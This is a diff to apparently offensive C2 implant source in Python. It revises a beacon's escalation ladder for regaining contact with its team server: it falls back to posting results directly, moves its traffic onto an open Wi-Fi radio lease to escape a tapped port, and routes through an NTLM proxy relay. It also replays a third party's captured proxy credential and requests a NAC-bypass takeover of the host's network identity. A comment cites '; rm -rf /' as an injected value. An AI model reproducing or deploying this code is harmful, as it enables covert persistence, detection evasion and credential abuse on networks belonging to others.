@@ -1929,8 +1929,11 @@ _EGRESS_WHEN_FLAGS = "flags"
 _EGRESS_WHEN_KEYS = _RESCUE_TRANSPORTS + (_EGRESS_WHEN_ANY,
                                           _EGRESS_WHEN_FLAGS)
 
-# Attempts per stuck window when the block names no number. Three, because
-# there are three verbs, so the default is one attempt each. Defaulted
+# Attempts per stuck window when the block names no number. Three, which
+# was one attempt per verb when there were three of them and is now a
+# number with no arithmetic behind it: it is kept because changing a
+# shipped default would change what every existing policy does, and
+# `docs/EGRESS_DECIDER.md` tells the operator to set their own. Defaulted
 # rather than refused because a forgotten line should not turn a policy
 # into a dead one -- but never *unbounded*, which is what an absent budget
 # would mean if this were zero or None.
@@ -2113,11 +2116,15 @@ def _egress_rule(item, index: int) -> dict:
         # the refusal that matters -- a verb the beacon really has, and the
         # one the team server reaches for on a stuck beacon, where there is
         # an operator to be asked about slowing an implant's check-ins.
+        # The count comes from the tuple, because the sentence used to
+        # say "three" and then list seven in the same breath -- on the one
+        # line an operator reads at the moment the whole decider has just
+        # been switched off under them.
         raise ValueError(
-            "%s.try is %r, which is not one of the three verbs a policy may "
+            "%s.try is %r, which is not one of the %d verbs a policy may "
             "name: %s. The allowed set is fixed in the implant -- a policy "
             "chooses from it and orders it, and cannot add to it"
-            % (where, verb, ", ".join(EGRESS_VERBS)))
+            % (where, verb, len(EGRESS_VERBS), ", ".join(EGRESS_VERBS)))
     return {"when": _egress_when(item.get("when"), where), "try": verb}
 
 
@@ -2240,6 +2247,17 @@ def _radio_lease(path: str) -> Tuple[str, int, str]:
     An unreadable or incomplete lease answers with empty strings, which the
     rung treats as a failure and rolls back: a radio with an address and no
     gateway is a change the operator cannot see.
+
+    **And a value that is not an address answers the same way.** dhclient
+    is the only thing that writes this file today, but the file lives in
+    the state directory this project already hardens against a local
+    attacker who got there first -- and what is read from it goes into
+    `ip rule add from <x>` and `ip addr replace <x>/<n>`. Nothing here
+    runs a shell, so the cost of a bad value is a confusing argv rather
+    than an injection; it is refused anyway, because "the lease is
+    incomplete" is a failure the rung already knows how to roll back and
+    "the lease says `; rm -rf /`" is not a reading this function should
+    pass on.
     """
     try:
         with open(path, "r") as handle:
@@ -2263,7 +2281,32 @@ def _radio_lease(path: str) -> Tuple[str, int, str]:
                 continue
             if 0 < bits <= 32:
                 prefix = bits
+    if not _is_ipv4(address):
+        address = ""
+    if not _is_ipv4(router):
+        router = ""
     return address, prefix, router
+
+
+def _is_ipv4(value: str) -> bool:
+    """Whether `value` is a dotted-quad address and nothing else.
+
+    `isdigit` is not enough on its own: it answers True for Unicode
+    digits, so `"\uff11\uff12\uff17"` would pass it and then reach
+    `ip addr replace` as something nobody typed. The characters are
+    checked against ASCII.
+    """
+    parts = (value or "").split(".")
+    if len(parts) != 4:
+        return False
+    for part in parts:
+        if not part or len(part) > 3:
+            return False
+        if any(character not in "0123456789" for character in part):
+            return False
+        if int(part) > 255:
+            return False
+    return True
 
 
 # ── The way out: the files the scout and the beacon meet over ──
@@ -3097,6 +3140,13 @@ class _NtlmProxyRelay:
         self._server: Optional[socket.socket] = None
         self._thread: Optional[threading.Thread] = None
         self._running = False
+        # The local address the hop to the upstream proxy leaves by, or
+        # None for the kernel's choice. Set by `Beacon._way_out_bind`
+        # while the radio rung holds a lease: see `_connect_upstream`.
+        # Not passed to `__init__`, because the relay is started long
+        # before any rung runs and the rung has to be able to reach a
+        # relay that is already serving.
+        self.source_address = None
 
     @staticmethod
     def _split_identity(username: str, domain: str) -> tuple:
@@ -3270,6 +3320,16 @@ class _NtlmProxyRelay:
     def _connect_upstream(self) -> socket.socket:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(self._HANDSHAKE_TIMEOUT)
+        # The way out's radio rung, if it holds a lease: this is the hop
+        # that actually leaves the device on an `proxy.ntlm.enabled`
+        # build. The session the rung binds connects to `127.0.0.1`,
+        # which is this relay's listener -- so without this the rung
+        # installed its source rule, reported "this implant's own traffic
+        # only", and the traffic went out of the dead tapped port. The
+        # same failure round two found on rung 3 itself, on the one proxy
+        # configuration nobody had checked.
+        if self.source_address:
+            sock.bind(self.source_address)
         sock.connect(self._upstream)
         return sock
 
@@ -3705,6 +3765,18 @@ class ProxyDiscovery:
             pass
 
     def _detect_wpad(self):
+        # **Two name lookups that the way out's radio rung cannot bind.**
+        # `socket.gethostbyname` goes through the system resolver, which
+        # takes no source address and whose configuration this project
+        # does not rewrite at runtime -- so while rung 3 holds a lease
+        # these two queries still leave by whatever route
+        # `/etc/resolv.conf` points at, which on a tapped drop-box is the
+        # port the rung exists to get off. The lookups carry no payload,
+        # name only `wpad` and `wpad.<search domain>`, and are made only
+        # when an operator or the decider asks for discovery. The limit is
+        # written here and in `docs/WAY_OUT.md` rather than implied; the
+        # beacon's own DNS queries, which it builds itself, do take the
+        # bind -- see `_dns_query`'s `source`.
         try:
             addr = socket.gethostbyname("wpad")
             if addr:
@@ -6520,6 +6592,12 @@ class Beacon:
         # `_leg_recovered` for why that was a defect. `_bound_session` is
         # the one place that reads it.
         self._way_out_source = ""
+        # The proxy and headers the implant used on the tapped port,
+        # while the radio rung holds a lease. Stashed rather than carried
+        # onto the radio -- a proxy on the host's network is not reachable
+        # from the radio's -- and put back by a rollback. See
+        # `_way_out_bind`.
+        self._way_out_tapped_path = None
         # Rung 4's latch, as this process remembers it. Once per
         # deployment, and deliberately **not** reset by `_leg_recovered`:
         # it is the one move here that cannot be undone from the far side,
@@ -7014,8 +7092,14 @@ class Beacon:
             # `http_proxy` in the implant's environment would do it too.
             #
             # And bare rather than `_bound_session`, which is the one place
-            # that is deliberate: a connection to `127.0.0.1` from the
-            # radio rung's leased address cannot be made at all.
+            # that is deliberate: the peer is on this host, so the radio
+            # rung's route has nothing to do with this connection and its
+            # source rule can never match it. Not because the bind would
+            # fail -- measured on Linux and on macOS, a socket bound to a
+            # non-loopback local address connects to `127.0.0.1` perfectly
+            # well, and an earlier comment here claimed otherwise. It is
+            # skipped because binding a local forward to an address a
+            # radio lease may drop at any moment buys nothing.
             session = _HttpSession()
             session.trust_env = False
         hdrs = self._post_headers() if endpoint == "result" else self._evasive_headers()
@@ -7047,27 +7131,53 @@ class Beacon:
             # wants credentials, and that is recorded above where the
             # status code is actually known.
             self._record_leg(transport, _rescue_class_of(e))
-            try:
-                # Through `_bound_session`, so a retry that bypasses the
-                # proxy does not also bypass the radio rung's source bind
-                # and leave by the dead tapped port.
-                direct = self._bound_session()
-                direct.trust_env = False
-                resp = direct.post(
-                    self._evasive_url(endpoint, base),
-                    json_data=self._wrap_payload(data),
-                    headers=hdrs,
-                    timeout=30,
-                )
-                if resp.status_code == 200:
-                    body = resp.json()
-                    result = self._unwrap_response(body)
-                    return result if result else {}
-            except Exception:
-                pass
+            direct = self._post_direct(endpoint, base, data, hdrs)
+            if direct is not None:
+                return direct
         except Exception as e:
             logger.debug("HTTPS %s failed: %s", endpoint, e)
             self._record_leg(transport, _rescue_class_of(e))
+            # **And the same retry here**, when the session had a proxy.
+            # `_ProxyError` above is raised only when urllib's reason
+            # string happens to contain "proxy" or "tunnel", so a proxy
+            # that simply refused the connection -- `[Errno 111]
+            # Connection refused` -- arrives in this arm instead, and the
+            # one fallback written for exactly that case never ran. That
+            # matters most on the ladder's ordinary climb: rung 2 borrows
+            # the host's proxy at hour 1 and rung 3 moves this implant
+            # onto its own radio at hour 5, where an RFC1918 proxy on the
+            # tapped network does not exist. No `proxy_found` flag here:
+            # a proxy that cannot be reached at all is not a proxy this
+            # network *has*, and that bit goes to the operator's panel.
+            if session.proxies:
+                direct = self._post_direct(endpoint, base, data, hdrs)
+                if direct is not None:
+                    return direct
+        return None
+
+    def _post_direct(self, endpoint, base, data, hdrs) -> Optional[dict]:
+        """The same POST with no proxy at all, or None. Raises nothing.
+
+        Through `_bound_session`, so a retry that bypasses the proxy does
+        not also bypass the radio rung's source bind and leave by the
+        dead tapped port. `trust_env` off, so the environment's proxies
+        do not put back what this is getting out of the way.
+        """
+        try:
+            direct = self._bound_session()
+            direct.trust_env = False
+            resp = direct.post(
+                self._evasive_url(endpoint, base),
+                json_data=self._wrap_payload(data),
+                headers=hdrs,
+                timeout=30,
+            )
+            if resp.status_code == 200:
+                body = resp.json()
+                result = self._unwrap_response(body)
+                return result if result else {}
+        except Exception:
+            pass
         return None
 
     @staticmethod
@@ -10167,6 +10277,37 @@ class Beacon:
                           "missing, unreadable, or of a version this "
                           "implant does not know. Nothing was changed."
                           % (what, _WAY_OUT_BORROW_NAME))
+        # **And not from a previous outage.** The scout removes this file
+        # when a window closes, so a borrow file older than the open
+        # window means the scout died -- in an earlier outage, with its
+        # capture still on the disk. Replaying a third party's credential
+        # that this implant has no current evidence for is the one thing
+        # the quiet rung should not do on a guess, and the operator's own
+        # `egress credential` is still there for somebody who decides
+        # otherwise.
+        #
+        # The window's own stamp and not a configured age: a scout that is
+        # alive rewrites this file every publish, so "written before this
+        # window opened" is exact, needs no second freshness rule beside
+        # `document_max_age_seconds`, and leaves rung 2 working for the
+        # whole of an outage the scout died in the middle of. A file with
+        # no stamp at all is a scout older than the field and is believed,
+        # for the reason `wanted()` believes a window with no `touched`.
+        written = loaded.get("written")
+        state = self._way_out_read(_WAY_OUT_STATE_NAME,
+                                   _WAY_OUT_STATE_VERSION) or {}
+        opened = state.get("opened")
+        if (isinstance(written, (int, float))
+                and not isinstance(written, bool)
+                and isinstance(opened, (int, float))
+                and not isinstance(opened, bool)
+                and written < opened):
+            return None, ("[error] Not borrowing %s: the scout's %s was "
+                          "written %.0f s before this stuck window opened, "
+                          "so it is a previous outage's capture and the "
+                          "scout that took it is no longer publishing. "
+                          "Nothing was changed."
+                          % (what, _WAY_OUT_BORROW_NAME, opened - written))
         return loaded, ""
 
     def _egress_credential(self, target: str) -> str:
@@ -10292,7 +10433,11 @@ class Beacon:
     # An open SSID, which leaves the tapped port altogether. Three bounds,
     # and each is in the code below rather than in a comment: the **onboard**
     # radio only, because a USB adapter is refused on the 13 W power budget
-    # (`hardware/OPEN_QUESTIONS.md:184`); a **time-boxed** association; and
+    # (`hardware/OPEN_QUESTIONS.md:184`); a **deadline per command**, and
+    # not a time box on the association -- nothing here disassociates on a
+    # timer, the only `iw ... disconnect` is in the rollback, and
+    # `docs/WAY_OUT.md` withdraws the design's "time-boxed" claim rather
+    # than repeating it; and
     # a **scoped** route -- a table of its own plus a source rule -- so that
     # this never becomes the host's default route. An implant that stranded
     # itself off the path it still has is the predecessor design's hardest
@@ -10516,19 +10661,70 @@ class Beacon:
         so the rule and the route were unreachable and the rung changed
         nothing while reporting that it had.
 
+        **A path change invalidates a proxy chosen for the old path**, and
+        that was a defect: this carried `proxies` and `headers` across,
+        so an implant that had borrowed the host's proxy at rung 2 -- an
+        RFC1918 address on the *tapped* network, by construction -- went
+        on posting to it from the radio's address, over a table-100 route
+        on which it does not exist. Rung 2 crosses at one hour dark and
+        rung 3 at five, so "borrow, then radio" is the ordinary climb:
+        the reversible rung poisoned the rung above it, nothing ever
+        delivered, nothing unbound, and the next step was the
+        irreversible one. Worse on an open guest SSID, which hands out
+        the same private space: if anything answers at that address, the
+        implant offers it a third party's `Proxy-Authorization` -- the
+        one thing `_HttpSession.headers`' own comment says must not leave
+        the device.
+
+        So the tapped path's proxy is **stashed, not carried**, and put
+        back by the rollback that returns this implant to the tapped
+        port. `trust_env` goes off with it: the environment's proxies are
+        the host's network's too.
+
         The HTTP session is replaced rather than mutated, for the reason
         `_egress_select_proxy` gives: `_https_post` reads
         `_proxy_session` once into a local, so swapping the object cannot
         change an opener a request is in the middle of building.
         """
-        self._way_out_source = address or ""
-        session = self._bound_session()
         previous = self._proxy_session
-        if previous is not None:
-            session.proxies = dict(previous.proxies)
-            session.headers = dict(previous.headers)
-            session.trust_env = previous.trust_env
+        session = None
+        if address and not self._way_out_source:
+            # Leaving the tapped port for the first time in this window.
+            if previous is not None:
+                self._way_out_tapped_path = (dict(previous.proxies),
+                                             dict(previous.headers),
+                                             previous.trust_env)
+            self._way_out_source = address
+            session = self._bound_session()
+            session.trust_env = False
+        elif not address and self._way_out_tapped_path is not None:
+            # Back on the tapped port: its proxy was right there, and it
+            # is this rung's business to leave the implant as it found it.
+            proxies, headers, trust_env = self._way_out_tapped_path
+            self._way_out_tapped_path = None
+            self._way_out_source = ""
+            session = self._bound_session()
+            session.proxies = proxies
+            session.headers = headers
+            session.trust_env = trust_env
+        else:
+            self._way_out_source = address or ""
+            session = self._bound_session()
+            if previous is not None:
+                session.proxies = dict(previous.proxies)
+                session.headers = dict(previous.headers)
+                session.trust_env = previous.trust_env
         self._proxy_session = session
+        # And the relay, on a build that has one. The session above
+        # connects to `127.0.0.1` there -- the relay's own listener -- so
+        # binding it alone left the hop that actually leaves the device
+        # unbound, and the rung reported "this implant's own traffic only"
+        # while HTTP went out of the dead tapped port. The same failure
+        # round two found on rung 3 itself, on the one proxy
+        # configuration nobody had checked.
+        relay = self._ntlm_relay
+        if relay is not None:
+            relay.source_address = (address, 0) if address else None
 
     def _bound_session(self) -> "_HttpSession":
         """A fresh HTTP session that still leaves by the leased address.
@@ -10554,8 +10750,11 @@ class Beacon:
         path switch belongs here, where adding it reaches all five.
 
         The one deliberate exception is the loopback forward in
-        `_https_post`, which builds a bare session: a connection to
-        `127.0.0.1` from a radio lease's address cannot be made at all.
+        `_https_post`, which builds a bare session: its peer is on this
+        host, so no source rule of the rung's can ever match it and the
+        bind would only pin it to a lease that may be dropped. The
+        relay's own upstream hop is **not** an exception -- see
+        `_way_out_bind`.
         """
         session = _HttpSession()
         if self._way_out_source:
@@ -10603,9 +10802,14 @@ class Beacon:
         identity was taken at boot, and offering the rung again would spend
         an attempt on something already done.
         """
+        # The flag is **not** set here, only read. Setting it on the
+        # refusal path cached the file's existence in memory, so an
+        # operator who deleted the request file to re-arm the rung -- the
+        # one way back, and the page says so -- found it still refused
+        # until the beacon restarted. The file is the authority; the flag
+        # is only what refuses when the write itself could not be made.
         if self._way_out_identity_spent or self._way_out_read(
                 _WAY_OUT_IDENTITY_NAME, _WAY_OUT_STATE_VERSION) is not None:
-            self._way_out_identity_spent = True
             return ("[error] Not taking the host's identity: this implant "
                     "has asked once already, and the rung is once per "
                     "deployment -- it is the one move that can end this "
@@ -10622,12 +10826,27 @@ class Beacon:
                     "nac_bypass.enabled is true, so the identity was taken "
                     "at boot and the rung is already spent. Nothing was "
                     "changed.")
-        self._way_out_identity_spent = True
         self._way_out_write(_WAY_OUT_IDENTITY_NAME, {
             "version": _WAY_OUT_STATE_VERSION,
             "requested": time.time(),
             "stuck_cycles": self._stuck_cycles,
         })
+        # The flag is set **only when the file is not there**, which is
+        # the whole of what it is for: a read-only `/opt` or a full disk
+        # must not turn the one irreversible move into one this implant
+        # retries every cycle. Setting it on the ordinary path as well
+        # cached the latch in memory, and then deleting the request file
+        # -- which this page calls the one way back -- left the rung
+        # refused until the beacon restarted.
+        if self._way_out_read(_WAY_OUT_IDENTITY_NAME,
+                              _WAY_OUT_STATE_VERSION) is None:
+            logger.warning(
+                "way out: rung 4's request could not be written to %s, so "
+                "this process is the only thing that knows it was asked: "
+                "the rung is spent until this beacon restarts, and "
+                "main.py will not see the request at all",
+                self._way_out_path(_WAY_OUT_IDENTITY_NAME))
+            self._way_out_identity_spent = True
         return ("Identity requested: the implant has asked its own main "
                 "process to start nac_bypass, which forwards EAPOL and then "
                 "originates this implant's traffic as the downstream host. "
@@ -10716,12 +10935,15 @@ class Beacon:
     def _egress_usable(self, rules: List[dict]) -> List[Tuple[int, dict]]:
         """The rules this build can fire, each with its number in the file.
 
-        Only one thing is dropped: a proxy verb on a build whose
-        `c2.proxy.mode` is `none`. That mode is an instruction about how
-        this implant talks, so both proxy verbs refuse it already -- what
+        Two things are dropped, and the first is a proxy verb on a build
+        whose `c2.proxy.mode` is `none`. That mode is an instruction about
+        how this implant talks, so both proxy verbs refuse it already -- what
         is settled here is that such a rule does not also cost the
         *budget*, since an attempt spent on a refusal the build guarantees
-        is an attempt the carrier does not get. Dropped when the policy is
+        is an attempt the carrier does not get. The second is a rung-2
+        verb that borrows from the scout, on a build with `c2.way_out`
+        off: there is nothing to borrow and every attempt would be a
+        refusal that still spent an attempt. Dropped when the policy is
         read rather than skipped on a stuck cycle, because the reason then
         reaches an operator while they still have a connection to read it
         over, and because a stuck cycle on an unreachable host is the
@@ -11077,6 +11299,27 @@ class Beacon:
         ev = points * success - coefficient * detect
         ev_prior = points * prior_success - coefficient * detect
         allowed = ev > threshold
+        # **And the ladder is an order, not only a price.** The page prints
+        # that promise in bold -- "a louder rung may never become
+        # available before a quieter one" -- and a model's `p_success`
+        # broke it: clamped to the prior + 0.2, an estimate of 0.99 on
+        # `identity` moved rung 4's crossing from hour 7 to hour **4**,
+        # while rung 3 stayed at hour 5 on the table. So the implant could
+        # be talked into the one irreversible move before it had ever been
+        # allowed to try its own radio. The clamp bounds the probability;
+        # it was never going to bound the ordering, because it is applied
+        # only to the verb that was named.
+        #
+        # Checked against each quieter rung's **own prior**, so this is
+        # structural: whatever a model proposes, and whatever the operator
+        # has configured, rung n waits for rung n-1 to have crossed on the
+        # table. The evidence modifiers are kept, because they move a rung
+        # in the direction the reader already consented to and the reader
+        # cannot invert them.
+        blocked = self._way_out_out_of_order(rung, points, coefficient,
+                                             threshold) if allowed else ""
+        if blocked:
+            allowed = False
         numbers = {
             "rung": rung,
             "row": row,
@@ -11091,6 +11334,7 @@ class Beacon:
             "ev": ev,
             "ev_prior": ev_prior,
             "allowed": allowed,
+            "blocked_by": blocked,
             # Marked the way `override_decisive` marks it on the server, so
             # the trail says which decisions rested on a model's estimate
             # rather than on the table.
@@ -11102,7 +11346,47 @@ class Beacon:
             % (rung, row, points, success, points * success, coefficient,
                detect, coefficient * detect, ev,
                "exceeds" if allowed else "does not exceed", threshold))
+        if blocked:
+            numbers["why"] += (
+                ", which it does -- but %s has not crossed yet, and a "
+                "louder rung may not be taken before a quieter one" % blocked)
         return allowed, numbers
+
+    def _way_out_out_of_order(self, rung: int, points: int,
+                              coefficient: float, threshold: float) -> str:
+        """The quieter rung that has not crossed yet, or "" if all have.
+
+        Each on its **own prior**, never on a proposed `p_success`: the
+        question is whether the curve has reached the quieter rung, and a
+        model's estimate about one verb says nothing about another.
+
+        The comparison is strict, as the gate's own is: a quieter rung
+        sitting exactly on the threshold has not crossed. That matters at
+        the top of the curve, where rung 4's EV overtakes rung 3's --
+        their `p_success` is 0.5 against 0.4, so they cross at 99 points
+        and the cap is 100 -- which is also the sharpest reason the order
+        is enforced here rather than left to the numbers.
+
+        The evidence modifier is applied, because "has it become
+        available" includes the evidence -- though with the shipped
+        numbers, and with every configuration the reader accepts, it
+        cannot change the answer: the only modifier on a quieter rung is
+        `portal_detect`, which may only *lower* rung 2's detection and so
+        only moves its crossing earlier than a floor that is already
+        below the rung being asked about. A mutation check recorded that
+        survivor rather than engineering a contrived configuration for
+        it; the modified value is kept because it is the one that means
+        what this reads as.
+        """
+        for lower in sorted(_WAY_OUT_ROW_OF):
+            if lower >= rung:
+                break
+            row = _WAY_OUT_ROW_OF[lower]
+            _, success, prior_detect = _WAY_OUT_ROWS[row]
+            detect = self._way_out_detect(lower, prior_detect)
+            if not points * success - coefficient * detect > threshold:
+                return row
+        return ""
 
     def _way_out_detect(self, rung: int, prior: float) -> float:
         """`p_detect` for this rung, moved by the evidence.
